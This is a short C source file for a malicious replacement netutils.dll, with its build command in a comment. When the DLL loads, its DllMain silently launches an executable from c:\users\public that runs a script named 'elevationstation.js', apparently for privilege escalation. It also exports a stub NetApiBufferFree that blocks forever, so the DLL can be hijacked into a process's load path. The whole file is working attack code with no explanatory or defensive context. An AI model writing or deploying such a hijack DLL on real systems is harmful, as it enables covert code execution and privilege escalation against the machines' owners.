//x86_64-w64-mingw32-gcc netutils.c -shared -o netutils.dll
#include <windows.h>
#include <lm.h>
#include <wtypes.h>

BOOL APIENTRY DllMain (HMODULE hModule, DWORD dwReason, LPVOID lpReserved){
    switch(dwReason){
        case DLL_PROCESS_ATTACH:
            WinExec("c:\\users\\public\\n0de.exe c:\\users\\public\\elevationstation.js", 0); 
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}
NET_API_STATUS WINAPI NetApiBufferFree(LPVOID Buffer)
{
        Sleep(INFINITE);
        return 1;
}

